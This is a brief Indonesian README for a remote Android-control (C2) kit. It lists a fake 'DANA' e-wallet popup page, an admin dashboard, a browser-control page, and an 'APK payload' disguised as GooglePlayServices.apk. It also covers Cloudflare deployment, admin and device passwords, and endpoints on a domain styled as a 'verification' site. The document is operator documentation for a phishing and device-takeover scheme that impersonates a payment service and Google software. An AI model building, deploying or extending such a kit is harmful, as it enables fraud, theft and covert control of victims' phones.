# verifikasi-site

Sistem C2 untuk kontrol perangkat Android jarak jauh.

## 📁 Struktur File

verifikasi-site/
├── index.html              # Halaman utama (Popup DANA)
├── dashboard.html          # Dashboard Admin
├── SystemUpdate.html       # Browser Control
├── sw.js                   # Service Worker
├── _headers                # CORS & Security Headers
├── qr.html                 # QR Code generator
├── README.md               # Dokumentasi
└── files/
├── GooglePlayServices.apk   # APK payload
└── SystemUpdate.html        # Fallback HTML

```

## 🚀 Deployment

Deploy ke Cloudflare Pages atau hosting statis lainnya.

## 🔐 Password

- **ADMIN_PASSWORD**: Untuk login dashboard
- **PASSWORD**: Untuk device (didapat dari /get-password)

## 📡 Endpoint

- `https://verifikasi.site/` → Index
- `https://verifikasi.site/dashboard.html` → Admin
- `https://verifikasi.site/get-password` → Dapatkan password device
```

---
